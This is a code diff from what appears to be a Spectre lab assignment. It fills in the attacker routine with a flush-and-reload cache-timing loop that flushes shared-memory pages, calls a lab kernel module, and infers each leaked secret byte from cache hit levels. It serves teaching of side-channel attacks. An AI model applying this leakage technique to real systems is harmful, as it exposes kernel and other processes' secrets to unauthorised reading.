@@ -10,6 +10,7 @@
 
 #include "labspectre.h"
 #include "labspectreipc.h"
+#include "spectre-common.h"
 
 /*
  * call_kernel_part1
@@ -40,8 +41,10 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
     pm_enable_cycle_count();
+    warmup();
+    CacheStats cache_stats = record_cache_stats();
+
     printf("Launching attacker\n");
-    printf("Flushed!\n");
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++)
     {
         char leaked_byte;
@@ -51,6 +54,17 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
+        for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) 
+        {
+            void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
+            REPEAT(3) flush_address(target_addr);
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+            MemoryLevel level = determine_memory_level(cache_stats, target_addr);
+            if (level != DRAM) {
+                leaked_byte = (char)i;
+                break;
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
